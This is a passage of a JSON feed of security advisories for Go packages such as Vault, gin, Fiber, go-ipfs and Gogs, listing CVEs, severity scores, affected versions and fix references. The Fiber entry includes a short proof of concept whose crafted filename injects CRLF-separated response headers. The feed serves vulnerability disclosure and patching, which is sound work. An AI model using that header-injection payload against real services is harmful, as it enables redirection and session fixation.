"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3283"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-01-nomad-s-exec-and-java-task-drivers-did-not-isolate-processes/20332"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:38:07Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-38j9-7pp9-2hjw", "modified": "2021-06-17T20:00:42Z", "published": "2021-06-08T18:52:05Z", "aliases": ["CVE-2021-32923"], "summary": "Invalid session token expiration ", "details": "HashiCorp Vault and Vault Enterprise allowed the renewal of nearly-expired token leases and dynamic secret leases (specifically, those within 1 second of their maximum TTL), which caused them to be incorrectly treated as non-expiring during subsequent use. Fixed in 1.5.9, 1.6.5, and 1.7.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.10.0"}, {"fixed": "1.5.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32923"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-15-vault-renewed-nearly-expired-leases-with-incorrect-non-expiring-ttls/24603"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/vault/"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-04T18:42:40Z", "nvd_published_at": "2021-06-03T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v592-xf75-856p", "modified": "2023-10-02T15:12:07Z", "published": "2021-06-29T21:12:56Z", "aliases": ["CVE-2020-26240"], "summary": "Erroneous Proof of Work calculation in geth", "details": "### Impact\nAn ethash mining DAG generation flaw in Geth could cause miners to erroneously calculate PoW in an upcoming epoch (estimated early January, 2021). This happened on the ETC chain on 2020-11-06. This issue is relevant only for miners, non-mining nodes are unaffected.\n\n### Specific Go Packages Affected\ngithub.com/ethereum/go-ethereum/consensus\n\n### Patches\nThis issue is also fixed as of 1.9.24. Thanks to @slavikus for bringing the issue to our attention and writing the fix. \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.24"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-v592-xf75-856p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26240"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/21793"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/d990df909d7839640143344e79356754384dcdd0"}, {"type": "WEB", "url": "https://blog.ethereum.org/2020/11/12/geth_security_release/"}], "database_specific": {"cwe_ids": ["CWE-682"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:52:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-599h-8wpj-75xj", "modified": "2021-05-20T21:24:49Z", "published": "2021-06-23T17:23:30Z", "aliases": ["CVE-2021-23365"], "summary": "Authentication Bypass in tyk-identity-broker", "details": "The package github.com/tyktechnologies/tyk-identity-broker before 1.1.1 are vulnerable to Authentication Bypass via the Go XML parser which can cause SAML authentication bypass. This is because the XML parser doesn\u2019t guarantee integrity in the XML round-trip (encoding/decoding XML data).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tyktechnologies/tyk-identity-broker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23365"}, {"type": "WEB", "url": "https://github.com/TykTechnologies/tyk-identity-broker/pull/147"}, {"type": "WEB", "url": "https://github.com/TykTechnologies/tyk-identity-broker/commit/243092965b0f93a95a14cb882b5b9a3df61dd5c0"}, {"type": "WEB", "url": "https://github.com/TykTechnologies/tyk-identity-broker/commit/46f70420e0911e4e8b638575e29d394c227c75d0"}, {"type": "WEB", "url": "https://github.com/TykTechnologies/tyk-identity-broker/releases/tag/v1.1.1"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMTYKTECHNOLOGIESTYKIDENTITYBROKER-1089720"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:24:49Z", "nvd_published_at": "2021-04-26T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cf55-rq8x-hm6f", "modified": "2021-05-28T18:00:48Z", "published": "2021-06-29T21:25:33Z", "aliases": ["CVE-2021-33497"], "summary": "Path Traversal in Dutchcoders transfer.sh", "details": "Dutchcoders transfer.sh before 1.2.4 allows Directory Traversal for deleting files.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dutchcoders/transfer.sh"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-33497"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/pull/373"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/releases/tag/v1.2.4"}, {"type": "WEB", "url": "https://vuln.ryotak.me/advisories/44"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-28T18:00:48Z", "nvd_published_at": "2021-05-24T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-433w-mm6h-rv9p", "modified": "2021-05-21T20:47:30Z", "published": "2021-06-23T17:29:06Z", "aliases": [], "summary": "Auth bypass in SAML provider", "details": "### Impact\n\nThe following vulnerabilities have been disclosed, which impact users leveraging the SAML auth provider:\n\n- [`goxmldsig` - Signature Validation Bypass](https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7)\n- [`gosaml2` - Authentication Bypass](https://github.com/russellhaering/gosaml2/security/advisories/GHSA-xhqq-x44f-9fgg)\n\n### Patches\n\n[Patch available](https://github.com/netlify/gotrue/pull/274)\n\nPlease upgrade to v1.0.0 or commit hash `a2b4dd6bc4ef7562d1df044098b303f564eefa90`\n\n### Workarounds\n\nNo known workarounds.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [gotrue](https://github.com/netlify/gotrue/issues)\n* Email us at [security@netlify.com](mailto:security@netlify.com)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/netlify/gotrue"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/netlify/gotrue/security/advisories/GHSA-433w-mm6h-rv9p"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T20:47:30Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-pw59-4qgf-jxr8", "modified": "2022-04-04T21:27:42Z", "published": "2021-06-18T22:04:32Z", "aliases": ["CVE-2020-17522"], "summary": "Cache Manipulation Attack in Apache Traffic Control", "details": "When ORT (now via atstccfg) generates ip_allow.config files in Apache Traffic Control 3.0.0 to 3.1.0 and 4.0.0 to 4.1.0, those files include permissions that allow bad actors to push arbitrary content into and remove arbitrary content from CDN cache servers. Additionally, these permissions are potentially extended to IP addresses outside the desired range, resulting in them being granted to clients possibly outside the CDN arcitechture.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/trafficcontrol"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-17522"}, {"type": "WEB", "url": "https://github.com/apache/trafficcontrol/commit/492290d810e9608afb5d265b98cd3f3e153e776b"}, {"type": "PACKAGE", "url": "https://github.com/apache/trafficcontrol"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r3c675031ac220b5eae64a9c84a03ee60045c6045738607dca4a96cb8@%3Ccommits.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r3de212a3da73bcf98fa2db7eafb75b2eb8e131ff466e6efc4284df09%40%3Cdev.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rc8bfd7d4f71d61e9193efcd4699eccbab3c202ec1d75ed9d502f08bf@%3Ccommits.trafficcontrol.apache.org%3E"}], "database_specific": {"cwe_ids": ["CWE-525", "CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-04T21:27:42Z", "nvd_published_at": "2021-01-26T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h395-qcrw-5vmq", "modified": "2023-08-29T19:56:23Z", "published": "2021-06-23T17:53:21Z", "aliases": ["CVE-2020-28483"], "summary": "Inconsistent Interpretation of HTTP Requests in github.com/gin-gonic/gin", "details": "When gin is exposed directly to the internet, a client's IP can be spoofed by setting the X-Forwarded-For header. This affects all versions of package github.com/gin-gonic/gin under 1.7.7. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gin-gonic/gin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28483"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/issues/2232"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/issues/2473"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/issues/2862"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/2474#23issuecomment-729696437"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/2632"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/2675"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/2844"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/2844/files#diff-e6ce689a25eaef174c2dd51fe869fabbe04a6c6afbd416b23eda138c82e761baR1432"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/commit/03e5e05ae089bc989f1ca41841f05504d29e3fd9"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/commit/5929d521715610c9dd14898ebbe1d188d5de8937"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/commit/bfc8ca285eb46dad60e037d57c545cd260636711"}, {"type": "PACKAGE", "url": "https://github.com/gin-gonic/gin"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/releases/tag/v1.7.0"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/releases/tag/v1.7.7"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0052"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGINGONICGIN-1041736"}], "database_specific": {"cwe_ids": ["CWE-113", "CWE-444"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:46:50Z", "nvd_published_at": "2021-01-20T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-57v4-m9jx-mh8r", "modified": "2023-02-13T17:29:53Z", "published": "2021-06-08T23:05:19Z", "aliases": ["CVE-2021-3499"], "summary": "Improper Input Validation", "details": "A vulnerability was found in OVN Kubernetes in versions up to and including 0.3.0 where the Egress Firewall does not reliably apply firewall rules when there is multiple DNS rules. It could lead to potentially lose of confidentiality, integrity or availability of a service", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ovn-org/ovn-kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3499"}, {"type": "WEB", "url": "https://github.com/ovn-org/ovn-kubernetes/pull/2169"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2021:1550"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2021-3499"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1949188"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-28T21:24:52Z", "nvd_published_at": "2021-06-02T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w3jx-wv97-67ph", "modified": "2021-05-28T18:03:43Z", "published": "2021-06-29T21:25:27Z", "aliases": ["CVE-2021-33496"], "summary": "Cross-site scripting in Dutchcoders transfer.sh", "details": "Dutchcoders transfer.sh before 1.2.4 allows XSS via an inline view.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dutchcoders/transfer.sh"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-33496"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/pull/373"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/commit/9df18fdc69de2e71f30d8c1e6bfab2fda2e52eb4"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/releases/tag/v1.2.4"}, {"type": "WEB", "url": "https://vuln.ryotak.me/advisories/43"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-28T18:03:43Z", "nvd_published_at": "2021-05-24T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-27pv-q55r-222g", "modified": "2021-05-21T18:31:52Z", "published": "2021-06-23T17:27:44Z", "aliases": ["CVE-2020-26279"], "summary": "Path traversal in github.com/ipfs/go-ipfs", "details": "### Impact\nIt is currently possible for path traversal to occur with DAGs containing relative paths during retrieval. This can cause files to be overwritten, or written to incorrect output directories. The issue can only occur when `ipfs get` is done on an affected DAG.\n\n1. The only affected command is `ipfs get`.\n2. The gateway is not affected.\n\n### Patches\nTraversal fix patched in https://github.com/whyrusleeping/tar-utils/commit/20a61371de5b51380bbdb0c7935b30b0625ac227\n`tar-utils` patch applied to go-ipfs via https://github.com/ipfs/go-ipfs/commit/b7ddba7fe47dee5b1760b8ffe897908417e577b2\n\n### Workarounds\nUpgrade to go-ipfs 0.8 or later.\n\n### References\nBinaries for the patched versions of go-ipfs are available on the IPFS distributions site, https://dist.ipfs.io/go-ipfs\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ipfs](https://github.com/ipfs/go-ipfs)\n* Email us at [security@ipfs.io](mailto:security@ipfs.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-ipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/security/advisories/GHSA-27pv-q55r-222g"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26279"}, {"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/commit/b7ddba7fe47dee5b1760b8ffe897908417e577b2"}, {"type": "WEB", "url": "https://github.com/whyrusleeping/tar-utils/commit/20a61371de5b51380bbdb0c7935b30b0625ac227"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T18:31:52Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9cx9-x2gp-9qvh", "modified": "2023-02-09T17:46:27Z", "published": "2021-06-29T21:24:28Z", "aliases": ["CVE-2020-15111"], "summary": "CRLF vulnerability in Fiber", "details": "### Impact\nThe filename that is given in [c.Attachment()](https://docs.gofiber.io/ctx#attachment) is not escaped, and therefore vulnerable for a CRLF injection attack. I.e. an attacker could upload a custom filename and then give the link to the victim. With this filename, the attacker can change the name of the downloaded file, redirect to another site, change the authorization header, etc.\n\n### Steps to reproduce\n```go\npackage main\n\nimport \"github.com/gofiber/fiber\"\n\nconst badFileName = \"another secret document.pdf\\\"\\r\\nLocation: google.com\\r\\nAuthorization: \\\"example_of_session_fixation\"\n\nfunc splitTheResponse(c *fiber.Ctx) {\n\tc.Attachment(badFileName)\n}\n\nfunc main() {\n\tapp := fiber.New()\n\tapp.Get(\"/attack\", splitTheResponse)\n\tapp.Listen(\"127.0.0.1:8080\")\n}\n```\n```\nHTTP/1.1 200 OK\nDate: Fri, 10 Jul 2020 19:47:04 GMT\nContent-Type: application/octet-stream\nContent-Length: 0\nContent-Disposition: attachment; filename=\"another secret document.pdf\"\nLocation: google.com\nAuthorization: \"example_of_session_fixation\"\n```\n\n### Patches\nThis issue has been patched in `v1.12.6` with commit [579](https://github.com/gofiber/fiber/pull/579/commits/f698b5d5066cfe594102ae252cd58a1fe57cf56f) escaping the filename by default.\n\n### Workarounds\nYou could of course serialize the input yourself before passing it to `ctx.Attachment()`, this is actually a good practice by default. But in case you forget, we got you covered \ud83d\udc4d \n\n### References\nA CRLF injection attack is one of several types of injection attacks. It can be used to escalate to more malicious attacks such as Cross-site Scripting (XSS), page injection, web cache poisoning, cache-based defacement, and more. A CRLF injection vulnerability exists if an attacker can inject the CRLF characters into a web application, for example using a user input form or an HTTP request, [see acunetix](https://www.acunetix.com/websitesecurity/crlf-injection/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [gofiber/fiber](https://github.com/gofiber/fiber)\n* Join us on [Discord](https://gofiber.io/discord)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gofiber/fiber"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gofiber/fiber/security/advisories/GHSA-9cx9-x2gp-9qvh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15111"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/pull/579"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/commit/f698b5d5066cfe594102ae252cd58a1fe57cf56f"}, {"type": "PACKAGE", "url": "https://github.com/gofiber/fiber"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0108"}], "database_specific": {"cwe_ids": ["CWE-74", "CWE-93"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T19:14:18Z", "nvd_published_at": "2020-07-20T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3fx4-7f69-5mmg", "modified": "2021-05-20T16:26:07Z", "published": "2021-06-23T17:14:12Z", "aliases": ["CVE-2016-9123"], "summary": "Integer Overflow in go-jose", "details": "go-jose before 1.0.5 suffers from a CBC-HMAC integer overflow on 32-bit architectures. An integer overflow could lead to authentication bypass for CBC-HMAC encrypted ciphertexts on 32-bit architectures.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/square/go-jose"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9123"}, {"type": "WEB", "url": "https://github.com/square/go-jose/commit/789a4c4bd4c118f7564954f441b29c153ccd6a96"}, {"type": "WEB", "url": "https://hackerone.com/reports/165170"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0009"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2016/11/03/1"}], "database_specific": {"cwe_ids": ["CWE-190"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:26:07Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m45g-f45x-vv22", "modified": "2021-05-20T21:19:40Z", "published": "2021-06-23T17:20:38Z", "aliases": ["CVE-2021-31232"], "summary": "Improper input validation in CNCF Cortex", "details": "The Alertmanager in CNCF Cortex before 1.8.1 has a local file disclosure vulnerability when -experimental.alertmanager.enable-api is used. The HTTP basic auth password_file can be used as an attack vector to send any file content via a webhook. The alertmanager templates can be used as an attack vector to send any file content because the alertmanager can load any text file specified in the templates list.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cortexproject/cortex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31232"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex/pull/4129/files"}, {"type": "WEB", "url": "https://community.grafana.com/c/security-announcements"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex"}, {"type": "WEB", "url": "https://lists.cncf.io/g/cortex-users/message/50"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:19:40Z", "nvd_published_at": "2021-04-30T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mr6h-chqp-p9g2", "modified": "2023-02-09T20:01:35Z", "published": "2021-06-29T18:32:44Z", "aliases": ["CVE-2014-8681"], "summary": "SQL Injection in gogs.io/gogs", "details": "SQL injection vulnerability in the GetIssues function in models/issue.go in Gogs (aka Go Git Service) 0.3.1-9 through 0.5.6.x before 0.5.6.1025 Beta allows remote attackers to execute arbitrary SQL commands via the label parameter to user/repos/issues.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.1"}, {"fixed": "0.5.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gogits/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.1"}, {"fixed": "0.5.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-8681"}, {"type": "WEB", "url": "https://github.com/gogits/gogs/commit/83283bca4cb4e0f4ec48a28af680f0d88db3d2c8"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/83283bca4cb4e0f4ec48a28af680f0d88db3d2c8"}, {"type": "WEB", "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/98695"}, {"type": "PACKAGE", "url": "https://github.com/gogits/gogs"}, {"type": "WEB", "url": "https://github.com/gogits/gogs/releases/tag/v0.5.8"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0021"}, {"type": "WEB", "url": "https://seclists.org/fulldisclosure/2014/Nov/31"}, {"type": "WEB", "url": "https://web.archive.org/web/20150711111508/http://gogs.io/docs/intro/change_log.html#v0.5.8-%40-2014-11-19"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8681"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/35237"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/129116/Gogs-Label-Search-Blind-SQL-Injection.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2014/Nov/31"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T21:47:51Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-cjjc-xp8v-855w", "modified": "2023-08-30T00:21:00Z", "published": "2021-06-23T18:02:39Z", "aliases": ["CVE-2020-7919"], "summary": "Helm uses crypto package vulnerable to panic from malformed X.509 certificate", "details": "The Helm core maintainers have identified a high severity security vulnerability in Go's `crypto` package affecting all versions prior to Helm 2.16.8 and Helm 3.1.0.\n\nThanks to @ravin9249 for identifying the vulnerability.\n\n### Impact\n\nGo before 1.12.16 and 1.13.x before 1.13.7 (and the `crypto/cryptobyte` package before 0.0.0-20200124225646-8b5121be2f68 for Go) allows attacks on clients resulting in a panic via a malformed X.509 certificate. This may allow a remote attacker to cause a denial of service.\n\n### Patches\n\nA patch to compile Helm against Go 1.14.4 has been provided for Helm 2 and is available in Helm 2.16.8. Helm 3.1.0 and newer are compiled against Go 1.13.7+.\n\n### Workarounds\n\nNo workaround is available. Users are urged to upgrade.\n\n### References\n\n- https://nvd.nist.gov/vuln/detail/CVE-2020-7919\n- https://github.com/helm/helm/pull/8288\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [the Helm repository](https://github.com/helm/helm/issues)\n* For security-specific issues, email us at <cncf-helm-security@lists.cncf.io>", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/helm/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.16.8"}]}]}, {"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20200124225646-8b5121be2f68"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-cjjc-xp8v-855w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7919"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://go.dev/cl/216677"}, {"type": "WEB", "url": "https://go.dev/cl/216680"}, {"type": "WEB", "url": "https://go.dev/issue/36837"}, {"type": "WEB", "url": "https://go.googlesource.com/go/+/b13ce14c4a6aa59b7b041ad2b6eed2d23e15b574"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!forum/golang-announce"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/golang-announce/-sdUB4VEQkA"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/golang-announce/Hsw4mHYc470"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/Hsw4mHYc470"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/S43VLYRURELDWX4D5RFOYBNFGO6CGBBC/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0229"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200327-0001/"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-4848"}, {"type": "WEB", "url": "https://www.oracle.com/security-alerts/cpuApr2021.html"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-18T22:07:33Z", 